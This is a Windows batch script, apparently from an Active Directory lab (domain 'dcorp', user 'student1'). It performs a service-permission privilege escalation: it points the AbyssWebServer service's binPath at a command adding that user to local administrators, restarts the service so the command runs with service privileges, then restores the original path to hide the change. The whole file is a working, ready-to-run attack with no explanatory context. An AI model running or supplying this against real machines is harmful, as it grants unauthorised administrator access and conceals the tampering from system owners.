@echo off
sc config AbyssWebServer binPath="net localgroup administrators dcorp\student1 /add" 1> NUL
sc stop AbyssWebServer 1>NUL
sc start AbyssWebServer 1>NUL
sc config AbyssWebServer binPath="c:\WebSever\abyss web server\WebServer\abyssws.exe --service" 1> NUL
sc stop AbyssWebServer 1>NUL
sc start AbyssWebServer 1>NUL
